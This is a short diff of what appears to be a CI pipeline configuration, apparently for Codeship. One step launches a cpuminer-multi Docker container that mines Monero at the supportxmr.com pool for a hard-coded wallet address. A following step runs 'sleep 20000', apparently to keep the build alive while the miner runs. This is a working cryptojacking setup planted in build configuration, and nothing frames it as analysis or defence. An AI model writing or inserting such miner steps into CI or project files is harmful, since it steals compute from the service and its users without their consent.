@@ -2,3 +2,4 @@
   command: docker run -d tpruvot/cpuminer-multi -a cryptonight -o stratum+tcp://sg1.supportxmr.com:3333 -u 4Aqfp4tau13hXtvtp6Zp2uAMKRpSFouJoP9uDELrn2Jp8ygurPJbTwGZqT5DLXoToHJ23qvxfFsqsE7r7QRV58Uk47FbgRn -p codeship-1
 - service: adddocker
   command: sleep 20000
+
